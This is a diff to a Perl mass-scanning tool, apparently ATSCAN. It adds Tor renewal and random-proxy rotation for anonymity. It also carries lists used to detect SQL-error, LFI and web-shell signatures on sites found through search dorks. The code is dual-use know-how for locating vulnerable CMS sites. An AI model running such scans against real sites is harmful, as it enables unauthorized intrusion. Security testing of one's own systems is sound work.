@@ -121,7 +121,9 @@ use Term::ANSIColor;
 ############################################################################################################################################################################################
 ## OPTIONS
 use Getopt::Long ();
+my $tor;
 my $proxy;
+my $random;
 my $help;
 my $output;
 my $replace;
@@ -133,7 +135,6 @@ my $mxss;
 my $Target;
 my $validation_text;
 my $exploit;
-my $sqlmap;
 my $p;
 my $mlfi;
 my $mjoomrfi;
@@ -176,8 +177,10 @@ my $noinfo;
 my $fbbf;
 
 Getopt::Long::GetOptions(\my %OPT,
+                        'tor=s' => \$tor,
                         'proxy=s' => \$proxy,
-                        'help' => \$help,
+                        'random' => \$random,
+                        'help|h' => \$help,
                         'save' => \$output,
                         'dork=s' => \$dork,
                         'level=s' => \$mlevel,
@@ -185,7 +188,6 @@ Getopt::Long::GetOptions(\my %OPT,
                         't=s' => \$Target,
                         'valid=s' => \$validation_text,
                         'exp=s' => \$exploit,
-                        'sqlmap' => \$sqlmap,
                         'p=s' => \$p,
                         'lfi' => \$mlfi,
                         'joomrfi' => \$mjoomrfi,
@@ -212,7 +214,7 @@ Getopt::Long::GetOptions(\my %OPT,
 						'command=s' => \$command,
 						'dom' => \$mdom,
 						'isup' => \$misup,
-						'about' => \$mabout,
+						'about|?' => \$mabout,
 						'replace=s' => \$replace,
 						'with=s' => \$with,
 						'md5=s' => \$mmd5,
@@ -234,12 +236,31 @@ Getopt::Long::GetOptions(\my %OPT,
 ) or advise();
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
+## BROWSER
 use IO::Socket::INET;
 use LWP::UserAgent;
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
+## BANNER LOGO RANDOM
+my @CODENAME = ("No monopoly for knowledge", "Virgin!! life fuck us all", "! Love Mezguida H4ckers !", "No Pe4ce betwin systems !", "Do not be 4 bl4ck h4cker!", "! Keep c4lm 4nd love me !", "Hacking is not Fucking !!", "No h4y sistem4 4 s4lvo !!", "When is brocken u hair it");
+$CODENAME = $CODENAME[int rand @CODENAME];
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 my @strings=('ar_JO', 'ar_KW', 'ar_LB', 'ar_LY', 'ar_MA', 'ar_OM', 'ar_QA', 'ar_SA', 'ar_SD', 'el_GR', 'el', 'iw_IL', 'iw', 'hi_IN', 'hu_HU', 'hu', 'is_IS', 'is', 'in_ID', 'cs-CZ', 'uk', 'vi_VN', 'vi', 'en-US', 'sk-SK', 'pt-BR', 'sq_AL', 'sq', 'ar_DZ', 'ar_BH', 'ar_EG', 'ar_IQ', 'be_BY', 'be', 'bg_BG', 'bg', 'ca_ES', 'ca', 'zh_CN', 'zh_HK', 'zh_SG', 'zh_TW', 'zh', 'hr_HR', 'hr', 'cs_CZ', 'cs', 'da_DK', 'da', 'nl_BE', 'nl_NL', 'nl', 'en_AU', 'en_CA', 'en_IN', 'en_IE', 'en_MT', 'en_NZ', 'en_PH', 'en_SG', 'en_ZA', 'en_GB', 'en_US', 'en', 'et_EE', 'et', 'fi_FI', 'fi', 'fr_BE', 'fr_CA', 'fr_FR', 'fr_LU', 'fr_CH', 'fr', 'de_AT', 'de_DE', 'de_LU', 'de_CH', 'de', 'el_CY', 'in', 'ga_IE', 'ga', 'it_IT', 'it_CH', 'it', 'ja_JP', 'ja_JP_JP', 'ja', 'ko_KR', 'ko', 'lv_LV', 'lv', 'lt_LT', 'lt', 'mk_MK', 'mk', 'ms_MY', 'ms', 'mt_MT', 'mt', 'no_NO', 'no_NO_NY', 'no', 'pl_PL', 'pl', 'pt_PT', 'pt', 'ro_RO', 'ro', 'ru_RU', 'ru', 'sr_BA', 'sr_ME', 'sr_CS', 'sr_RS', 'sr', 'sk_SK', 'sk', 'sl_SI', 'sl', 'es_AR', 'es_BO', 'es_CL', 'es_CO', 'es_CR', 'es_DO', 'es_EC', 'es_SV', 'es_GT', 'es_HN', 'es_MX', 'es_NI', 'es_PA', 'es_PY', 'es_PE', 'es_PR', 'es_ES', 'es_US', 'es_UY', 'es_VE', 'es', 'sv_SE', 'sv', 'th_TH', 'th_TH_TH', 'th', 'tr_TR', 'tr', 'uk_UA', 'uk');
 $myrand = $strings[int rand @strings];
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+## BROWSER LANGUAGES
+my @browserlangs=("af", "am", "ar-SA", "as", "az-Latn", "be", "bg", "bn-BD", "bn-IN", "bs", "ca", "ca-ES-valencia", "cs", "da", "de", "de-DE", "el", "en-CA", "en-GB", "en-IN", "en-AU", "en-US", "es", "es-ES", "es-US", "es-MX", "et", "eu", "fa", "fi", "fil-Latn", "fr", "fr-FR", "fr-CA", "ga", "gd-Latn", "gl", "gu", "ha-Latn", "he", "hi", "hr", "hu", "hy", "id", "ig-Latn", "is", "it", "it-IT", "ja", "ka", "kk", "km", "kn", "ko", "kok", "ku-Arab", "ky-Cyrl", "lb", "lt", "lv", "mi-Latn", "mk", "ml", "mn-Cyrl", "mr", "ms", "mt", "nb", "ne", "nl", "nl-BE", "nn", "nso", "or", "pa", "pa-Arab", "pl", "prs-Arab", "pt-BR", "pt-PT", "qut-Latn", "quz", "ro", "ru", "rw", "sd-Arab", "si", "sk", "sl", "sq", "sr-Cyrl-BA", "sr-Cyrl-RS", "sr-Latn-RS", "sv", "sw", "ta", "te", "tg-Cyrl", "th", "ti", "tk-Latn", "tn", "tr", "tt-Cyrl", "ug-Arab", "uk", "ur", "uz-Latn", "vi", "zh-Hans", "zh-Hant", "zu");
+$browserlang = $browserlangs[int rand @browserlangs];
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+## ERRORS
+my @ERROR = ("root:x", "You have an error in your SQL syntax", "Warning: mysql", "ORA-", "Oracle ODBC", "Oracle Error", "Oracle Driver", "Oracle DB2", "error ORA-", "SQL command not properly ended", "DB2 ODBC", "DB2 error", "DB2 Driver", "ODBC SQL", "ODBC DB2", "ODBC Driver", "ODBC Error", "ODBC Microsoft Access", "ODBC Oracle", "ODBC Microsoft Access Driver", "Warning: pg_", "PostgreSql Error:", "Supplied argument is not a valid PostgreSQL result", "function.mysql", "MySQL result index", "MySQL Error", "MySQL ODBC", "PostgreSQL query failed: ERROR: parser: parse error", "Warning: sybase_", "function.sybase", "Sybase result index", "Sybase Error:", "Sybase: Server message:", "ODBC Driver:",  "Database Query", "SQLServer JDBC Driver", "JDBC SQL", "JDBC Oracle", "JDBC MySQL", "JDBC error", "JDBC Driver", "java.io.IOException: InfinityDB", "Warning: include", "Warning: require", "Fatal error: require", "ADODB_Exception", "Warning: include", "Warning: require_once", "function.include", "EDisallowed Parent Path", "function.require","MySQL Driver", "mysqli.query", "num_rows", "mysql error:", "supplied argument is not a valid MySQL result resource", "Error Executing Database Query", "mysql_fetch_assoc", "Warning: main", "Warning: session_start", "Warning: getimagesize", "Warning: array_merge", "Warning: preg_match", "GetArray", "EFetchRow", "Warning: preg_", "Warning: ociexecute", "Warning: ocifetchstatement", "PHP Warning:", "Version Information: Microsoft .NET Framework", "Server.Execute Error", "ASP.NET_SessionId", "ASP.NET is configured to show verbose error messages", "BOF or EOF", "Unclosed quotation mark", "Error converting data type varchar to numeric", "LuaPlayer ERROR:", "CGILua message", "ELua error", "Incorrect syntax near", "Fatal error", "Invalid Querystring", "An illegal character has been found in the statement", "<title>Shell</title>", "<title>(.*)Shell</title>", "<title>(.*)Shell(.*)</title>", "<title>(.*)r57shell(.*)</title>", "Hacked by", "backdoor by", "<title>(.*)C99Shell(.*)</title>");
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+## CMS VERIFICATION
+my @MODULETYPE = ("<a href=\"https:\/\/wordpress.org\/\">Proudly powered by WordPress", "<meta name=\"generator\" content=\"Joomla", "Powered by <a href=\"http:\/\/www.textpattern.com\" title=\"Textpattern", "<a href=\"http:\/\/www.simplemachines.org/about/copyright.php\" title=\"Free Forum Software\" target=\"_blank\">SMF", "Powered by <a href=\"http:\/\/www.phpbb.com/\">phpBB", "<a href=\"https:\/\/www.vbulletin.com\" id=\"vbulletinlink\">vBulletin", "vBulletin Solutions\, Inc\. All rights reserved", "Powered By <a href=\"http:\/\/www.mybboard.net\" target=\"_blank\">MyBB", "<a href=\"http:\/\/www.cloudflare.com\/\" target=\"_blank\" style", "DDoS protection by CloudFlare", "name=\"Generator\" content=\"Drupal", "<meta name=\"generator\" content=\"PostNuke", "<a href=\"/about.php\">About ATutor", "<META NAME=\"GENERATOR\" CONTENT=\"PHP-Nuke", "Powered by <a href=\"http:\/\/moodle.org\" title=\"Moodle\">Moodle", "<meta name=\"key words\" content=\"moodle", "Powered by <a href=\"http:\/\/www.adaptcms.com\">AdaptCMS", "<meta name=\"generator\" content=\"SilverStripe - http:\/\/silverstripe.org\" \/>", "<a href=\"http:\/\/www.modx.com\" target=\"_blank\"> Powered by MODx", "<meta name=\"generator\" content=\"XOOPS", "Powered by osCommerce", "<a href=\"http:\/\/www.oscommerce.com\" target=\"_blank\">osCommerce", "<a class=\"_blank_blank\" href=\"http:\/\/www.prestashop.com\" target=\"_blank", "Software para Ecommerce de PrestaShop", "<meta name=\"generator\" content=\"b2evolution", "MAGENTO\, INC\. ALL RIGHTS RESERVED", "Magento Ecommerce by Smart Solutions", "all rights reserved Zen Cart", "<a href=\"http:\/\/www.zen-cart.com\" target=\"_blank\">Zen Cart", "Powered by concrete5", "<meta name=\"generator\" content=\"concrete", "Powered By OpenCart");
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## SYSTEM RANDOM
@@ -266,7 +287,7 @@ my @sys=(
 "Windows 2000; WOW64; $myrand; rv:16.0.1",
 "Windows 98; WOW64; $myrand; rv:16.0.1",
 "Windows 95; WOW64; $myrand; rv:16.0.1"
-);        
+);      
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## BROWSER RANDOM
@@ -307,6 +328,14 @@ use HTTP::Cookies;
 use File::Basename;
 use FindBin '$Bin';
 system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+## JOOMLA SITES VERIFICATION
+@JOOMCMS = ("/administrator/index.php");
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+## WORDPRESS SITES VERIFICATION
+@WPCMS = ("/wp-login.php");
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## LFI
@@ -371,101 +400,48 @@ sub ZIP {@ZIP = ("/backup.tar.gz", "/backup/backup.tar.gz", "/backup/backup.zip"
 }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
-## BROWSER LANGUAGES
-my @browserlangs=('fr', 'it', 'ie', 'us', 'br', 'ma', 'dz', 'se', 'nl', 'il', 'ca', 'pt', 'pl', 'eg', 'tn', 'ae', 'qa', 'af', 'iq', 'ch', 'mx', 've', 'es', 'ro', 'ru', 'jp', 'id', 'de', 'ua', 'sa', 'ok', 'fi', 'no', 'cz', 'lu', 'uy');
-############################################################################################################################################################################################
-############################################################################################################################################################################################
-## ERRORS
-my @ERROR = ("root:x", "You have an error in your SQL syntax", "Warning: mysql", "ORA-", "Oracle ODBC", "Oracle Error", "Oracle Driver", "Oracle DB2", "error ORA-", "SQL command not properly ended", "DB2 ODBC", "DB2 error", "DB2 Driver", "ODBC SQL", "ODBC DB2", "ODBC Driver", "ODBC Error", "ODBC Microsoft Access", "ODBC Oracle", "ODBC Microsoft Access Driver", "Warning: pg_", "PostgreSql Error:", "Supplied argument is not a valid PostgreSQL result", "function.mysql", "MySQL result index", "MySQL Error", "MySQL ODBC", "PostgreSQL query failed: ERROR: parser: parse error", "Warning: sybase_", "function.sybase", "Sybase result index", "Sybase Error:", "Sybase: Server message:", "ODBC Driver:",  "Database Query", "SQLServer JDBC Driver", "JDBC SQL", "JDBC Oracle", "JDBC MySQL", "JDBC error", "JDBC Driver", "java.io.IOException: InfinityDB", "Warning: include", "Warning: require", "Fatal error: require", "ADODB_Exception", "Warning: include", "Warning: require_once", "function.include", "EDisallowed Parent Path", "function.require","MySQL Driver", "mysqli.query", "num_rows", "mysql error:", "supplied argument is not a valid MySQL result resource", "Error Executing Database Query", "mysql_fetch_assoc", "Warning: main", "Warning: session_start", "Warning: getimagesize", "Warning: array_merge", "Warning: preg_match", "GetArray", "EFetchRow", "Warning: preg_", "Warning: ociexecute", "Warning: ocifetchstatement", "PHP Warning:", "Version Information: Microsoft .NET Framework", "Server.Execute Error", "ASP.NET_SessionId", "ASP.NET is configured to show verbose error messages", "BOF or EOF", "Unclosed quotation mark", "Error converting data type varchar to numeric", "LuaPlayer ERROR:", "CGILua message", "ELua error", "Incorrect syntax near", "Fatal error", "Invalid Querystring", "An illegal character has been found in the statement", "<title>Shell</title>", "<title>(.*)Shell</title>", "<title>(.*)Shell(.*)</title>", "<title>(.*)r57shell(.*)</title>", "Hacked by", "backdoor by", "<title>(.*)C99Shell(.*)</title>");
-############################################################################################################################################################################################
-############################################################################################################################################################################################
-## JOOMLA SITES VERIFICATION
-@JOOMCMS = ("/administrator/index.php");
-############################################################################################################################################################################################
-############################################################################################################################################################################################
-## WORDPRESS SITES VERIFICATION
-@WPCMS = ("/wp-login.php");
-############################################################################################################################################################################################
-############################################################################################################################################################################################
-## CMS VERIFICATION
-my @MODULETYPE = ("<a href=\"https:\/\/wordpress.org\/\">Proudly powered by WordPress", "<meta name=\"generator\" content=\"Joomla", "Powered by <a href=\"http:\/\/www.textpattern.com\" title=\"Textpattern", "<a href=\"http:\/\/www.simplemachines.org/about/copyright.php\" title=\"Free Forum Software\" target=\"_blank\">SMF", "Powered by <a href=\"http:\/\/www.phpbb.com/\">phpBB", "<a href=\"https:\/\/www.vbulletin.com\" id=\"vbulletinlink\">vBulletin", "vBulletin Solutions\, Inc\. All rights reserved", "Powered By <a href=\"http:\/\/www.mybboard.net\" target=\"_blank\">MyBB", "<a href=\"http:\/\/www.cloudflare.com\/\" target=\"_blank\" style", "DDoS protection by CloudFlare", "name=\"Generator\" content=\"Drupal", "<meta name=\"generator\" content=\"PostNuke", "<a href=\"/about.php\">About ATutor", "<META NAME=\"GENERATOR\" CONTENT=\"PHP-Nuke", "Powered by <a href=\"http:\/\/moodle.org\" title=\"Moodle\">Moodle", "<meta name=\"key words\" content=\"moodle", "Powered by <a href=\"http:\/\/www.adaptcms.com\">AdaptCMS", "<meta name=\"generator\" content=\"SilverStripe - http:\/\/silverstripe.org\" \/>", "<a href=\"http:\/\/www.modx.com\" target=\"_blank\"> Powered by MODx", "<meta name=\"generator\" content=\"XOOPS", "Powered by osCommerce", "<a href=\"http:\/\/www.oscommerce.com\" target=\"_blank\">osCommerce", "<a class=\"_blank_blank\" href=\"http:\/\/www.prestashop.com\" target=\"_blank", "Software para Ecommerce de PrestaShop", "<meta name=\"generator\" content=\"b2evolution", "MAGENTO\, INC\. ALL RIGHTS RESERVED", "Magento Ecommerce by Smart Solutions", "all rights reserved Zen Cart", "<a href=\"http:\/\/www.zen-cart.com\" target=\"_blank\">Zen Cart", "Powered by concrete5", "<meta name=\"generator\" content=\"concrete", "Powered By OpenCart");
-###########################################################################################################################################################################################
-###########################################################################################################################################################################################
-## BANNER
-if (!defined $nobanner) {
-  my @LOGO = ("
-  \033[0;33m    /\\ ___ /\\                
-  \033[0;33m   (  o   o  ) 
-  \033[0;33m   \\  >#<  /      
-  \033[0;33m    /       \\       \033[1;36m######  ###### ###### ###### ###### ##  ##
-  \033[0;33m   /         \\   ^  \033[1;36m##  ##    ##   ##     ##  ## ##  ## ### ##
-  \033[0;33m  |           | ||  \033[1;36m######    ##   ###### ##     ###### ######
-  \033[0;33m   \\          /-//  \033[1;36m##  ##    ##       ## ##  ## ##  ## ## ###
-  \033[0;33m    ///  ///--      \033[1;36m##  ##    ##   ###### ###### ##  ## ##  ##",
-  "     
-  \033[0;33m     . \\\\\\|||///       
-  \033[0;33m    / \\| O   O |  
-  \033[0;33m    \\ / \\` _ '/  
-  \033[0;33m    (#)   | |        \033[1;36m######  ###### ###### ###### ###### ##  ##
-  \033[0;33m     #\\/( * * )\\     \033[1;36m##  ##    ##   ##     ##  ## ##  ## ### ##
-  \033[0;33m     #\\/(==*==)/     \033[1;36m######    ##   ###### ##     ###### ######
-  \033[0;33m     #   || ||       \033[1;36m##  ##    ##       ## ##  ## ##  ## ## ###        
-  \033[0;33m    .#---'| |`----.  \033[1;36m##  ##    ##   ###### ###### ##  ## ##  ##",
-  "              
-  \033[0;33m  o       o                  
-  \033[0;33m   \\_____/   
-  \033[0;33m   /=O=O=\\   ______  
-  \033[0;33m  /   ^   \\  \\\\\\\\\\\\\\   \033[1;36m######  ###### ###### ###### ###### ##  ##
-  \033[0;33m  \\ \\___/ / /\\ ___  \\  \033[1;36m##  ##    ##   ##     ##  ## ##  ## ### ##
-  \033[0;33m   \\_ V _/ /\\ /\\\\\\\\  \\ \033[1;36m######    ##   ###### ##     ###### ######
-  \033[0;33m     \\  \\_/\\ /\\ \@_/  / \033[1;36m##  ##    ##       ## ##  ## ##  ## ## ###
-  \033[0;33m      \\____\\__\\_____/  \033[1;36m##  ##    ##   ###### ###### ##  ## ##  ##",
-  "      
-  \033[0;33m     \\\\\\|||/// 
-  \033[0;33m     /=======\\     
-  \033[0;33m    = __   __ =   
-  \033[0;33m    =( o) (o )=   \033[1;36m######  ###### ###### ###### ###### ##  ##
-  \033[0;33m    =    U    =   \033[1;36m##  ##    ##   ##     ##  ## ##  ## ### ##
-  \033[0;33m     _________    \033[1;36m######    ##   ###### ##     ###### ######
-  \033[0;33m     \\__!|!__/    \033[1;36m##  ##    ##       ## ##  ## ##  ## ## ###
-  \033[0;33m        \\_/       \033[1;36m##  ##    ##   ###### ###### ##  ## ##  ##"
-  );
-  $LOGO = $LOGO[int rand @LOGO];
-  print "$LOGO\n";
+## RENEW PROXY
+sub newtor {
+  if (defined $tor) {
+    system("[ -z 'pidof tor' ] || pidof tor | xargs sudo kill -HUP -1;");
+  }
+  if ((defined $proxy) && (substr($proxy, -4) eq '.txt')) {
+    randomproxy();
+  }
 }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
-## BANNER LOGO RANDOM
-my @CODENAME = ("No monopoly for knowledge", "Virgin!! life fuck us all", "! Love Mezguida H4ckers !", "No Pe4ce betwin systems !", "Do not be 4 bl4ck h4cker!", "! Keep c4lm 4nd love me !", "Hacking is not Fucking !!", "No h4y sistem4 4 s4lvo !!", "When is brocken u hair it");
-$CODENAME = $CODENAME[int rand @CODENAME];
-print "\033[0;31m   __________________________( $CODENAME )________________\n";
-############################################################################################################################################################################################
-############################################################################################################################################################################################
-## PRINT DESCLAIMER
-if ((!defined $dork) && (!defined $fbbf) && (!defined $help) && (!defined $Target) && (!defined $rangip) && (!defined $mmd5) && (!defined $mencode64) && (!defined $checkversion) && (!defined $mdecode64)) {
-  print "\n";
-  advise2();
-}
-desclaimer();
-############################################################################################################################################################################################
-############################################################################################################################################################################################
-## TOR PROXY
-if (defined $proxy) {
-  $ua->proxy([qw/ http https /] => $proxy);
-  $ua->cookie_jar({});
+## RANDOM PROXY
+sub randomproxy {
+  open(my $filehandle, '<', $proxy);
+  my @resultarray;
+  while(my $line = <$filehandle>){
+    chomp $line;
+    my @linearray = split(" ", $line);
+    push(@resultarray, @linearray);
+	$proxys = $resultarray[int rand @resultarray];
+  }
 }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## TOOL VERSION
 sub existantversion {
-  $existantversion='version 8.1 Stable';
+  $existantversion='version 8.2 Stable';
   return $existantversion;
+}
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+## LOGO VERSION
+sub logoversion {
+  $logoversion=existantversion();
+  $logoversion=~ s/version/V/g;
+  $logoversion=~ s/Stable//g;
+  return $logoversion;
 }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## CHECK VERSION
 sub checkversion {
-  testconection();
   existantversion();
   my $URL = 'https://github.com/AlisamTechnology/ATSCAN/blob/master/version.log';
   $request = HTTP::Request->new('GET', $URL);
@@ -614,11 +590,14 @@ sub scandetail {
   #########################################
   #########################################
   print "\033[1;33m[+] PROXY:: ";
-  if (defined $proxy) {
-    print "\033[0;32m[$proxy]\n";
+  if ((!defined $tor) && (!defined $proxy)) {
+    print "\033[0;36mNo!";
   }else{
-    print "\033[0;36mNo! \n";
+    if (defined $tor) { print "\033[0;33m[Tor Proxy]";}
+    if (defined $proxy) { print "\033[0;33m[$proxy]";countproxies();}
+	if (defined $random) { print "\033[0;33m[Random Proxy]";}
   }
+  print "\n";
   #########################################
   #########################################
   if (defined $password) {
@@ -757,18 +736,9 @@ sub scandetail {
     print "\033[1;33m[+] SCAN LEVEL:: ";
     print "\033[0;36m$mlevel \n";
   }
-  if ((defined $command) || (defined $sqlmap)){
+  if (defined $command){
     print "\033[1;33m[+] EXTERN CMD:: ";
-    if (defined $command){
-      print "\033[0;36m/External Command ";
-    }
-    if (defined $sqlmap){
-      print "\033[0;36m/Sqlmap ";
-	  if (defined $p){
-        print "\033[0;36m[Vul Param $p] ";
-	  }
-    }
-    print "\n";
+    print "\033[0;36m/External Command\n";
   }
   if (defined $output) {
     print "\033[1;33m[+] OUTPUT:: ";
@@ -783,21 +753,28 @@ sub scandetail {
     print "\033[0;36m/Jump extra info\n";
   }
   if (!defined $mlevel) {
-    print "\033[1;37m[ ]-----------------------------------------------------------------------[ ]\n";
+	print "\033[1;37m[ ]-----------------------------------------------------------------------[ ]\n";
+	testconection();
   }
 }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## INTERNET CONNECTION VERIFICATION
 sub testconection {
-  my $URL = "http://www.google.com";
-  $request = HTTP::Request->new('GET', $URL);
-  $response = $ua->request($request);
-  if ( !$response->is_success ) {
-    print "\033[1;37m[ ]-----------------------------------------------------------------------[ ]\n";
-    print "\033[0;31m[!] Upss.. Your Internet connection seems not active!\n";
-    print "\033[0;31m[!] Check Your Connection OR Proxy Setting!\n";
-	exit();
+  if ((!defined $mmd5) && (!defined $mencode64) && (!defined $mdecode64) && (!defined $help) && (!defined $mabout)) {
+    OUTER:
+    my $URL = "http://www.google.com";
+    $request = HTTP::Request->new('GET', $URL);
+    $response = $ua->request($request);
+    if ( !$response->is_success ) {
+      print "\033[1;37m[ ]-----------------------------------------------------------------------[ ]\n";
+	  if ((defined $proxy) && (substr($proxy, -4) eq '.txt')) {
+		print "\033[0;33m[!] $proxys seems not working!\n";
+	  }
+      print "\033[0;31m[!] Upss.. Your Internet connection seems not active!\n";
+      print "\033[0;31m[!] Check Your Connection OR Proxy Setting!\n";
+	  exit();
+	}  
   }
 }
 ############################################################################################################################################################################################
@@ -806,8 +783,6 @@ sub testconection {
 sub dorklist {
   $checkdorklist = $Bin."/dorks.txt";
   if (-e $checkdorklist){ unlink $checkdorklist};
-  my $pat2 = 'inurl:|intitle:|intext:|index of|allinurl';
-  my $pat3 = ",";
   if (defined $dork){
 	if (substr($dork, -4) eq '.txt') {
       if ($dork eq 'dorks.txt') {
@@ -818,11 +793,8 @@ sub dorklist {
 	  use File::Copy qw(copy);
 	  copy $dork, $Bin.'/dorks.txt';
     }else{
-	  if ($dork =~ m/$pat2/) {
-	    $dork =~ s/$pat2//g;
-        $dork =~ s/ /+/g;
-      }elsif ($dork =~ m/$pat3/) {
-        $dork =~ s/$pat3/ /g;
+      if ($dork =~ m/,/) {
+        $dork =~ s/,/ /g;
       }elsif ($dork =~ m/ /) {
         $dork =~ s/ /+/g;
 	  }
@@ -871,11 +843,8 @@ sub dorklist {
 	  use File::Copy qw(copy);
 	  copy $Target, $Bin.'/dorks.txt';
     }else{
-	  if ($Target =~ m/$pat2/) {
-	    $Target =~ s/$pat2//g;
-        $Target =~ s/ /+/g;
-      }elsif ($Target =~ m/$pat3/) {
-        $Target =~ s/$pat3/ /g;
+      if ($Target =~ m/,/) {
+        $Target =~ s/,/ /g;
       }elsif ($Target =~ m/ /) {
         $Target =~ s/ /+/g;
 	  }
@@ -892,7 +861,6 @@ sub dorklist {
 ############################################################################################################################################################################################
 ## CHECK CONECTION + IF NEEDED TARGET LIST
 sub ifgettargetlist {
-  testconection();
   if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
     targetlist();
   }
@@ -903,9 +871,6 @@ sub ifgettargetlist {
 sub targetlist {
   $checkdorklist = $Bin."/search.txt";
   if (-e $checkdorklist){ unlink $checkdorklist};
-  my $pat2 = 'inurl:|intitle:|intext:|index of|allinurl';
-  my $pat3 = ",";
-
   if (defined $rangip) {
     if (($rangip =~ /(\d+)\.(\d+)\.(\d+)\.(\d+)\-(\d+)\.(\d+)\.(\d+)\.(\d+)/) && ($1<=255 && $2<=255 && $3<=255 && $4<=255 && $5<=255 && $6<=255 && $7<=255 && $8<=255)) { 
       my $startIp = $1.".".$2.".".$3.".".$4;
@@ -943,11 +908,8 @@ sub targetlist {
 	  use File::Copy qw(copy);
 	  copy $Target, $Bin.'/search.txt';
     }else{
-	  if ($Target =~ m/$pat2/) {
-	    $Target =~ s/$pat2//g;
-        $Target =~ s/ /+/g;
-      }elsif ($Target =~ m/$pat3/) {
-        $Target =~ s/$pat3/ /g;
+      if ($Target =~ m/,/) {
+        $Target =~ s/,/ /g;
       }elsif ($Target =~ m/ /) {
         $Target =~ s/ /+/g;
 	  }
@@ -958,40 +920,6 @@ sub targetlist {
         close (FILE);
 	  }
     }
-  }
-}
-############################################################################################################################################################################################
-############################################################################################################################################################################################
-## EXPLOIT LIST
-if (defined $exploit) {
-  $checkdorklist = $Bin."/exploits.txt";
-  if (-e $checkdorklist){ unlink $checkdorklist};
-  my $pat2 = 'inurl:|intitle:|intext:|index of|allinurl';
-  my $pat3 = ",";
-  if (substr($exploit, -4) eq '.txt') {
-    if ($exploit eq 'exploits.txt') {
-	  print "\033[1;37m[ ]-----------------------------------------------------------------------[ ]\n";
-	  print "\033[0;31m[!] Rename your list [$exploit] I use the same name!\n";
-	  exit();
-    }
-	use File::Copy qw(copy);
-	copy $exploit, $Bin.'/exploits.txt';
-  }else{
-    if ($exploit =~ m/$pat2/) {
-	  $exploit =~ s/$pat2//g;
-      $exploit =~ s/ /+/g;
-
-    }elsif ($exploit =~ m/$pat3/) {
-      $exploit =~ s/$pat3/ /g;
-    }elsif ($exploit =~ m/ /) {
-      $exploit =~ s/ /+/g;
-    }
-    my @exploits = split / /, $exploit;
-    foreach my $exploit (@exploits) {
-      open (FILE, '>'.$Bin.'/exploits.txt');
-      print FILE "$exploit\n";
-      close (FILE);
-	}
   }
 }
 ############################################################################################################################################################################################
@@ -1018,6 +946,24 @@ sub checkip{
     exit();
   }else{
     return $URL;
+  }
+}
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+## COUNT PROXIES IN LIST
+sub countproxies {
+  if ((defined $proxy) && (substr($proxy, -4) eq '.txt')) {
+    my $lc = 0;
+    my $file = $proxy;
+    if (!-e $proxy) {
+	  print "\033[1;37m\n\033[1;37m[ ]-----------------------------------------------------------------------[ ]\n";
+	  print "\033[0;31m[!] Dont make me crazy! NO $proxy found!\n";
+	  exit();
+    }
+    open $file, "<", $proxy;
+    $lc++ while <$file>;
+    print "\033[0;33m[$lc Proxies in List!]";
+    close $file;
   }
 }	
 ############################################################################################################################################################################################
@@ -1126,7 +1072,7 @@ sub control {
 	    $URL =~ s/$replace/$with/ig;
 	 }
   }
-  if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+  $URL=checkurlschema($URL);	
   return $URL;
 }
 ############################################################################################################################################################################################
@@ -1134,27 +1080,20 @@ sub control {
 ## EXTRAT INFO PROCESS SCAN
 sub checkextrainfo {
   my $checkip=$URL1;
-  $req = HTTP::Request->new('GET', $checkip);
-  my $re = $ua->request($req);
-  my $st = $re->code;
-
+  if (index($checkip, 'http://') != -1) {
+    $checkip =~ s/http:\/\///g;
+  }elsif (index($checkip, 'https://') != -1) {
+	$checkip =~ s/https:\/\///g;
+  }
+  $checkip=~ s/\/.*//s;
+  use Socket;
+  my $ip = inet_aton($checkip);
   print "\033[1;37m    IP:     ";
-  if ($st==200) {
-    if (index($checkip, 'http://') != -1) {
-	  $checkip =~ s/http:\/\///g;
-    }elsif (index($checkip, 'https://') != -1) {
-	  $checkip =~ s/https:\/\///g;
-    }
-    $checkip=~ s/\/.*//s;
-    use Socket;
-    my $ip = Socket::inet_ntoa(inet_aton($checkip));
-	if (defined $ip) {
-      print "\033[0;37m$ip\n";
-	}else{
-      print "\033[0;37mUndefined!\n";
-	}
+  if ($ip) { 
+    $address = inet_ntoa($ip);
+	print "\033[0;37m$address\n";
   }else{
-    print "\033[0;37mUndefined!\n";
+	print "\033[0;37mUndefined!\n";
   }
   if ((defined $replace) && (defined $with)) {
 	print "\033[1;37m    REPLC:  ";
@@ -1165,13 +1104,13 @@ sub checkextrainfo {
 ############################################################################################################################################################################################
 ## SCAN PROCEDURE
 sub checkedurl {
+  if (defined $random) {newtor();}
   $request = HTTP::Request->new('GET', $URL1);
   my $response = $ua->request($request);
   my $html = $response->content;
   my $status = $response->code;
   my $serverheader = $response->server;
   my $httpd = $response->headers_as_string;
-  
   if (!defined $noinfo) {
     checkextrainfo();
     if($URL1 !~ /http:\/\//) { $URL1 = "http://$URL1"; };	
@@ -1283,11 +1222,19 @@ sub checkerrortype {
 }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
+## CHECK URL PARTS
+sub checkurlschema {
+  $URL=$_[0];
+  if ($URL !~ /http:\/\//) { $URL = "http://$URL"; };
+  return $URL;
+}
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 ## DELETE SEARCH + EXPLOITS LIST
 sub deleteqexp { 
   unlink $Bin.'/search.txt';
   unlink $Bin.'/exploits.txt';
-}	  	
+}
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## DEFINE CMS DETECTION
@@ -1403,17 +1350,16 @@ sub desclaimer {
 ############################################################################################################################################################################################
